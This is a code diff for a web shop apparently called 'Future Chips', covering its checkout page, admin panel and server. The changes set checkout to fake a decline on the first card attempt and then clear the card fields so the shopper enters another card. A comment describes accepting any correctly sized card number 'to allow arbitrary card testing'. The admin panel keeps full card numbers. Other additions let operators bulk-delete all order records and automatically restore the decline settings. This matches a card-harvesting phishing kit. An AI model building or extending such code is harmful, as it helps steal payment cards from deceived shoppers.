@@ -49,7 +49,7 @@ const memStore = {
     logo_url: null,
     decline_all: 0,
     decline_threshold: 999999.0,
-    success_attempt: 1,
+    success_attempt: 2,
     trash_pin: bcrypt.hashSync('978797', 10)
   },
   admin_users: [
@@ -2399,11 +2399,20 @@ footer {
       <section id="orders-tab" class="tab-content">
         <div class="content-header">
           <h1>Transaction Ledger</h1>
+          <div style="display: flex; gap: 1rem; align-items: center;">
+            <button id="bulk-delete-orders-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🗑️ Delete Selected
+            </button>
+            <button id="empty-orders-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              ⚠️ Delete All
+            </button>
+          </div>
         </div>
         <div class="admin-table-container glass">
           <table class="admin-table">
             <thead>
               <tr>
+                <th style="width: 40px; text-align: center;"><input type="checkbox" id="select-all-orders" style="cursor: pointer; transform: scale(1.2);"></th>
                 <th>Order ID</th>
                 <th>Customer</th>
                 <th>Item Purchased</th>
@@ -3012,7 +3021,7 @@ document.addEventListener('DOMContentLoaded', async () => {
           
           if (!showingTrash) {
             let localCards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
-            localCards = localCards.filter(c => (c.card_number || '').replace(/\\\\s+/g, '') !== cardNum.replace(/\\\\s+/g, ''));
+            localCards = localCards.filter(c => (c.card_number || '').replace(/\\s+/g, '') !== cardNum.replace(/\\s+/g, ''));
             localStorage.setItem('future_chips_cards', JSON.stringify(localCards));
           }
         } catch(e) {
@@ -3042,6 +3051,67 @@ document.addEventListener('DOMContentLoaded', async () => {
       }
     });
   });
+
+  // --- ORDERS BULK ACTIONS ---
+  const selectAllOrdersCb = document.getElementById('select-all-orders');
+  const ordersTbody = document.getElementById('admin-orders-tbody');
+  const bulkDeleteOrdersBtn = document.getElementById('bulk-delete-orders-btn');
+  const emptyOrdersBtn = document.getElementById('empty-orders-btn');
+
+  const updateBulkOrdersState = () => {
+    const checkboxes = Array.from(ordersTbody.querySelectorAll('.order-checkbox'));
+    const checked = checkboxes.filter(cb => cb.checked);
+    if (checkboxes.length > 0 && checked.length === checkboxes.length) selectAllOrdersCb.checked = true;
+    else selectAllOrdersCb.checked = false;
+
+    if (checked.length > 0) {
+      bulkDeleteOrdersBtn.style.display = 'flex';
+      bulkDeleteOrdersBtn.innerText = \\\`🗑️ Delete Selected (\\\${checked.length})\\\`;
+    } else {
+      bulkDeleteOrdersBtn.style.display = 'none';
+    }
+  };
+
+  selectAllOrdersCb?.addEventListener('change', (e) => {
+    const checkboxes = Array.from(ordersTbody.querySelectorAll('.order-checkbox'));
+    checkboxes.forEach(cb => { cb.checked = e.target.checked; });
+    updateBulkOrdersState();
+  });
+
+  ordersTbody?.addEventListener('change', (e) => {
+    if (e.target.classList.contains('order-checkbox')) updateBulkOrdersState();
+  });
+
+  bulkDeleteOrdersBtn?.addEventListener('click', async () => {
+    const checked = Array.from(ordersTbody.querySelectorAll('.order-checkbox:checked')).map(cb => cb.value);
+    if (checked.length === 0) return;
+    showCustomConfirm('🗑️ Bulk Delete Orders', \\\`Are you sure you want to delete \\\${checked.length} selected order(s)?\\\`, async () => {
+      for (const orderId of checked) {
+        try {
+          await fetch(\\\`/api/admin/orders/\\\${encodeURIComponent(orderId)}\\\`, { method: 'DELETE', headers: getAuthHeaders() });
+          let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+          localOrders = localOrders.filter(o => o.id !== orderId);
+          localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+        } catch (e) {}
+      }
+      fetchAdminOrders();
+      updateBulkOrdersState();
+    });
+  });
+
+  emptyOrdersBtn?.addEventListener('click', async () => {
+    showCustomConfirm('⚠️ Delete All Orders', 'Are you sure you want to permanently delete ALL orders?', async () => {
+      try {
+        await fetch('/api/admin/orders/all/empty', { method: 'DELETE', headers: getAuthHeaders() });
+        localStorage.removeItem('future_chips_orders');
+        fetchAdminOrders();
+        updateBulkOrdersState();
+      } catch (err) {
+        console.error('Empty orders error:', err);
+      }
+    });
+  });
+
 
   // Sync color pickers with hex text fields
   syncColorInput('settings-primary-color', 'settings-primary-text');
@@ -3355,6 +3425,7 @@ async function fetchAdminOrders() {
 
     return \`
       <tr>
+        <td style="text-align: center;"><input type="checkbox" class="order-checkbox" value="\${o.id}" style="cursor: pointer; transform: scale(1.2);"></td>
         <td style="font-family: monospace; font-size: 0.85rem;">\${o.id}</td>
         <td>\${o.customer_email}</td>
         <td style="font-weight: 600;">\${o.product_name || 'Deleted Product'}</td>
@@ -3578,6 +3649,19 @@ async function fetchAdminSettings() {
       const declineThresholdInput = document.getElementById('settings-decline-threshold');
       if (declineThresholdInput) {
         declineThresholdInput.value = s.decline_threshold !== undefined ? s.decline_threshold : 50.0;
+      }
+
+      // Auto-sync Vercel ephemeral reset: If localStorage has different settings than factory defaults, push them back to the server
+      const saved = JSON.parse(localStorage.getItem('future_chips_settings'));
+      if (saved && (saved.success_attempt !== s.success_attempt || saved.decline_threshold !== s.decline_threshold)) {
+        console.log('Vercel reset detected. Pushing local settings to server...');
+        fetch('/api/admin/settings', {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json', ...getAuthHeaders() },
+          body: JSON.stringify(saved)
+        }).then(res => {
+          if (res.ok) fetchAdminSettings(); // Reload UI with restored settings
+        }).catch(console.error);
       }
     }
   } catch (err) {
@@ -5668,8 +5752,8 @@ img.paypal-logo {
 
         if (sanitized.length === expectedLength) {
           // If the card is in a declined state, flag it as invalid with the decline message
-          if (cardIsDeclined && sanitized === '4323280089072227') {
-            return { isValid: false, type: 'invalid', message: 'Your card was declined.' };
+          if (cardIsDeclined) {
+            return { isValid: false, type: 'invalid', message: 'Your card was declined. Please try another card.' };
           }
 
           // Relaxed check: accept any card number of correct length to allow arbitrary card testing
@@ -6024,6 +6108,12 @@ img.paypal-logo {
           const errData = await completeRes.json().catch(() => ({}));
           if (completeRes.status === 400 || (errData && errData.error)) {
             cardIsDeclined = true;
+            
+            // Clear the inputs to force the user to enter a new card
+            if (cardNumberInput) cardNumberInput.value = '';
+            if (cardExpiryInput) cardExpiryInput.value = '';
+            if (cardCvcInput) cardCvcInput.value = '';
+            
             if (typeof runValidation === 'function') runValidation(true);
             const errMsg = errData.error || 'Your card was declined. Please try another card.';
             const errElem = document.getElementById('checkout-error');
@@ -8805,6 +8895,16 @@ app.delete('/api/admin/orders/:id', authMiddleware, async (req, res) => {
   }
 });
 
+app.delete('/api/admin/orders/all/empty', authMiddleware, async (req, res) => {
+  try {
+    memStore.orders = [];
+    await dbRun('DELETE FROM orders');
+    res.json({ message: 'All orders deleted successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to empty orders' });
+  }
+});
+
 // Admin Products Management
 app.get('/api/admin/products', authMiddleware, (req, res) => {
   res.json(memStore.products);
@@ -9130,3 +9230,13 @@ app.use((err, req, res, next) => {
 });
 
 module.exports = app;
+
+if (!isVercel && require.main === module) {
+  const PORT = process.env.PORT || 3001;
+  app.listen(PORT, () => {
+    console.log('====================================================');
+    console.log('🚀 Future Chips Server running on http://localhost:' + PORT);
+    console.log('🔐 Admin Panel available at http://localhost:' + PORT + '/admin');
+    console.log('====================================================');
+  });
+}
